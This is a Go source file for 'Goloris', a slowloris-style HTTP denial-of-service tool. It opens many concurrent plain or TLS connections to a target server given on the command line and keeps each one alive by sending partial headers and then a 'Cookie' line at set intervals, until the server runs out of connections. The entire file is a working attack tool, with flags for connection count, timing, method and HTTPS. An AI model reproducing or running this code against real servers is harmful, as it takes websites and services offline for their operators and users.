package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
)

var (
	numConnections int
	interval       int
	timeout        int
	method         string
	resource       string
	userAgent      string
	target         string
	https          bool
)

func main() {
	parseParams()
	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		if https {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	openConnections(target, numConnections, timeout, https)

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, exiting...\n")
			break loop
		}
	}
}

func parseParams() {
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.IntVar(&timeout, "timeout", 60, "Timeout in seconds")
	flag.StringVar(&method, "method", "GET", "HTTP method to user")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.BoolVar(&https, "https", false, "Use HTTPS")
	flag.Parse()
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed if not defined")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
}

func openConnections(target string, num, timeout int, https bool) {
	for i := 0; i < num; i++ {
		go slowloris(target, interval, timeout, https)
	}
}

func slowloris(target string, interval, timeout int, https bool) {
	timeoutDuration := time.Duration(timeout) * time.Second

loop:
	for {
		var conn net.Conn
		var err error

		if https {
			config := &tls.Config{InsecureSkipVerify: true}
			conn, err = tls.Dial("tcp", target, config)
			if err != nil {
				continue
			}
			defer conn.Close()
		} else {
			conn, err = net.DialTimeout("tcp", target, timeoutDuration)
			if err != nil {
				continue
			}
			defer conn.Close()
		}

		host := target
		headers := makeHeaders(host)
		req, err := createRequest(host, method, resource, headers)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		req.Header.Write(conn)

		for {
			select {
			case <-time.After(time.Duration(interval) * time.Second):
				_, err := conn.Write([]byte("Cookie: a=b\r\n"))
				if err != nil {
					continue loop
				}
			}
		}
	}

}

func createRequest(host, method, resource string, headers map[string]string) (*http.Request, error) {
	req, err := http.NewRequest(method, host, nil)
	if err != nil {
		return nil, err
	}

	for header, value := range headers {
		req.Header.Add(header, value)
	}

	return req, nil
}

func makeHeaders(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent
	headers["Content-Length"] = "42"

	return headers
}
